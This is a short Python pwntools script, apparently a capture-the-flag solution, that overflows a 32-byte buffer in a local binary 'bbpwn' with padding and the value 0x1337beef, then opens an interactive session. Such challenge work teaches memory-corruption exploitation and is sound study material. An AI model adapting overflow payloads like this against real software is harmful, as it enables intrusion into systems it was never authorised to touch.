from pwn import *


p = process("./bbpwn")

payload = 'A'*32
payload += p32(0x1337beef)

p.recvuntil("Enter a string:")
p.sendline(payload)

p.interactive()